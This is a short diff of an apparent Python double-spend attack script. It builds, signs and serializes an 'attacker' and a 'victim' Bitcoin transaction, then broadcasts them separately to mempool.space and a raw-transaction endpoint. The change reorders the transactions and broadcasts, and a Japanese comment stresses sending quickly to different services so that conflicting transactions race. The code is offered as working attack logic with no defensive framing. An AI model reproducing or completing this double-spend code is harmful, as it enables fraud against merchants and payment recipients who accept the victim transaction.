@@ -130,7 +130,7 @@ tx_attacker = transaction_util.sign(tx_attacker, 0, fake_send_from)
 tx_victim   = transaction_util.sign(tx_victim, 0, fake_send_from)
 tx_victim   = cryptos.serialize(tx_victim)
 tx_attacker = cryptos.serialize(tx_attacker)
-block = f"{tx_attacker}{tx_victim}"
+block = f"{tx_victim}{tx_attacker}"
 
 block = transaction_util.signall(block, fake_send_from)
 block = cryptos.serialize(block)
@@ -165,11 +165,11 @@ else:
     send_rawtransaction(tx_victim, testnet)
 
 # >>>> FRK BC EXE DSPND 0w0
-broadcast_mempool_space(tx_attacker, testnet)
+broadcast_mempool_space(block, testnet)
 print()
 input("--- READY... --- ")
 #transaction_util.pushtx(block) #異なるサービスに素早く送ることが重要。
-broadcast_mempool_space(block, testnet)
+broadcast_mempool_space(tx_attacker, testnet)
 print()
 print()
 
